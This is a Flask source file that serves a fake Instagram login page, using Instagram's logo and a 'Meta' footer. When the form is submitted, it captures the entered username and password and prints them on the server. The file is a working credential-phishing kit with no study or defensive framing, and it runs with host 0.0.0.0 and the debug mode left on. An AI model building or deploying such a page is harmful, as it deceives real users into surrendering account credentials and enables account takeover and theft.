from flask import Flask, request, render_template_string, send_from_directory

app = Flask(__name__)

# Serve the image file
@app.route('/instagram.jpeg')
def serve_image():
    return send_from_directory('.', 'instagram.jpeg')

# HTML Form
html_form = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .login-container {
      width: 90%;
      max-width: 400px;
      background:transparent;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
    }
    .logo {
      margin-bottom: 20px;
      background: transparent;
    }
    .logo img {
      width: 78px;
      border-radius: 20%;
      border: 3px solid #ffffff;
      box-shadow: 0 4px 8px rgba(255, 255, 255, 0.2);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      background: #333;
      border: none;
      border-radius: 5px;
      color: white;
    }
    input::placeholder {
      color: #aaa;
    }
    .btn {
      width: 100%;
      padding: 10px;
      background: #1e90ff;
      border: none;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background: #1c86ee;
    }
    .forgot-password,
    .create-account {
      margin-top: 15px;
      color: #1e90ff;
      text-decoration: none;
      font-size: 14px;
    }
    .meta {
      margin-top: 20px;
      color: #666;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="/instagram.jpeg" alt="Instagram Logo">
    </div>

    <form action="/" method="POST">
      <input
        type="text"
        id="username"
        name="username"
        placeholder="Username, email, or mobile"
        required
      />
      <input
        type="password"
        id="password"
        name="password"
        placeholder="Password"
        required
      />
      <button type="submit" class="btn">Log in</button>
    </form>

    <a href="#" class="forgot-password">Forgotten Password?</a>
    <a href="#" class="create-account">Create new account</a>
    <div class="meta">Meta</div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # Print received data
        print(f"Received -> Username: {username}, Password: {password}")

        #return f"<h3>Received Username: {username}, Password: {password}</h3>"
    
    return render_template_string(html_form)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
